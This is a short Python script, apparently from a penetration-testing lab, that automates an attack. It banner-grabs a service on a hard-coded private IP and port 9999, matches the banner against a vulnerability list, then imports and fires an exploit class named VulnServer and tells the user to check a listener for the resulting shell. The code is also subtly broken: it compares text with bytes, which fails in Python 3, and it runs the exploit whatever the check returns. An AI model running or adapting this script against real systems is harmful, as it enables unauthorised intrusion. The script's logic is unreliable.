#!/usr/bin/python3

import socket

def grab_banner(ip,port):
    try:
        s = socket.socket()
        s.connect((ip,port))
        banner = s.recv(1024)
        return banner
    except:
        return

def check_vulns(banner):
    with open('vulns.txt','r') as f:
        for line in f.readlines():
            if line.strip('\n').split('_|_')[0] in banner:
                print('[+] Server is vulnerable: ' + banner.strip('\n'))
                return line.strip('\n').split('_|_')[1] 

    return

def main():
    ip = '10.0.0.209'
    port = 9999

    response = grab_banner(ip,port) 

    if response: 
        chk = check_vulns(response)
        # Update with specific name call
        from VulnServer import VulnServer
        exp = VulnServer(ip,port)
        exp.exploit()
        print('[*] Check your listener')

if __name__ == '__main__':
    main()

